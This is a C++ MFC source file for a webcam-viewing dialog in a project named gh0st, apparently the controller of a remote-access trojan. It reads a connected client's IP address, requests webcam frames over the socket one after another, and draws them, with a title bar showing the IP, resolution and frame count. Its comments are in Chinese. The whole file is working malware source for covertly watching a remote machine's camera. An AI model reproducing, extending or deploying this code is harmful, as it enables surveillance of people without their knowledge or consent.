// WebCamDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "WebCamDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg dialog

CWebCamDlg::CWebCamDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CWebCamDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWebCamDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_WEBCAM));
	m_nCount		= 0;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	memcpy(&m_bmih, m_pContext->m_DeCompressionBuffer.GetBuffer(1), sizeof(BITMAPINFOHEADER));
	
	m_lpScreenDIB = (LPVOID)LocalAlloc(LPTR, m_bmih.biSizeImage);
	memset(&m_MMI, 0, sizeof(MINMAXINFO));

	m_nCount = 0;
}


void CWebCamDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWebCamDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWebCamDlg, CDialog)
	//{{AFX_MSG_MAP(CWebCamDlg)
	ON_WM_CLOSE()
	ON_WM_PAINT()
	ON_WM_SHOWWINDOW()
	ON_WM_SIZE()
		ON_MESSAGE(WM_GETMINMAXINFO, OnGetMiniMaxInfo)
	ON_WM_TIMER()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWebCamDlg message handlers


void CWebCamDlg::OnReceiveComplete()
{
	m_nCount++;
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_WEBCAM_DIB:
		DrawDIB();
		break;
	default:
		// 传输发生异常数据
		SendException();
		break;
	}
}


void CWebCamDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

BOOL CWebCamDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

LRESULT	CWebCamDlg::OnGetMiniMaxInfo(WPARAM wParam, LPARAM lparam)
{	
	// 如果m_MMI已经被赋值
	if (m_MMI.ptMaxSize.x > 0)
		memcpy((void *)lparam, &m_MMI, sizeof(MINMAXINFO));
	
	return NULL;
}

void CWebCamDlg::InitMMI()
{
	RECT	rectClient, rectWindow;
	GetWindowRect(&rectWindow);
	GetClientRect(&rectClient);
	ClientToScreen(&rectClient);
	
	int nWidthAdd = (rectClient.left - rectWindow.left) + (rectWindow.right - rectClient.right);
	int nHeightAdd = (rectClient.top - rectWindow.top) + (rectWindow.bottom - rectClient.bottom);
	
	
	int	nMinWidth = 35 + nWidthAdd;
	int	nMinHeight = 28 + nHeightAdd;
	int	nMaxWidth = m_bmih.biWidth + nWidthAdd;
	int	nMaxHeight = m_bmih.biHeight + nHeightAdd;
	
	
	// 最小的Track尺寸
	m_MMI.ptMinTrackSize.x = nMinWidth;
	m_MMI.ptMinTrackSize.y = nMinHeight;
	
	// 最大化时窗口的位置
	m_MMI.ptMaxPosition.x = 1;
	m_MMI.ptMaxPosition.y = 1;
	
	// 窗口最大尺寸
	m_MMI.ptMaxSize.x = nMaxWidth;
	m_MMI.ptMaxSize.y = nMaxHeight;
	
	// 最大的Track尺寸也要改变
	m_MMI.ptMaxTrackSize.x = nMaxWidth;
	m_MMI.ptMaxTrackSize.y = nMaxHeight;
}

void CWebCamDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	// 销毁时移除自己在视图中的数据

	::ReleaseDC(m_hWnd, m_hDC);
	DrawDibClose(m_hDD);
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);	
	CDialog::OnClose();
}

BOOL CWebCamDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	SetTimer(1, 200, NULL);

	CString str;
	str.Format("\\\\%s %d * %d", m_IPAddress, m_bmih.biWidth, m_bmih.biHeight);
	SetWindowText(str);
	// 初始化窗口大小结构
	InitMMI();
	SendNext();

	m_hDD = DrawDibOpen();
	m_hDC = GetDC()->m_hDC;

	SendNext();
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CWebCamDlg::SendNext()
{
	BYTE	bBuff = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CWebCamDlg::DrawDIB()
{
	memcpy(m_lpScreenDIB, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_bmih.biSizeImage);
	OnPaint();
}

void CWebCamDlg::OnPaint() 
{
	CPaintDC dc(this); // device context for painting
	
	// TODO: Add your message handler code here
	RECT rect;
	GetClientRect(&rect);
	DrawDibDraw
		(
		m_hDD, 
		m_hDC,
		0, 0,
		rect.right, rect.bottom,
		&m_bmih,
		m_lpScreenDIB,
		0, 0,
		m_bmih.biWidth, m_bmih.biHeight,
		DDF_SAME_HDC
		);
	// Do not call CDialog::OnPaint() for painting messages
}

void CWebCamDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{
	CDialog::OnShowWindow(bShow, nStatus);
	
	// TODO: Add your message handler code here
	
}

void CWebCamDlg::OnSize(UINT nType, int cx, int cy) 
{
	CDialog::OnSize(nType, cx, cy);
	
	OnPaint();
	// TODO: Add your message handler code here
	
}

void CWebCamDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	// m_pContext可能为NULL，所以一定要放到try里
	try
	{
		CString str;
		str.Format("\\\\%s %d * %d 第%d帧 %d%%", m_IPAddress, m_bmih.biWidth, m_bmih.biHeight,
			m_nCount, m_pContext->m_nTransferProgress);
		SetWindowText(str);	
	}catch (...){}

	CDialog::OnTimer(nIDEvent);	
}

void CWebCamDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	delete this;
	CDialog::PostNcDestroy();
}
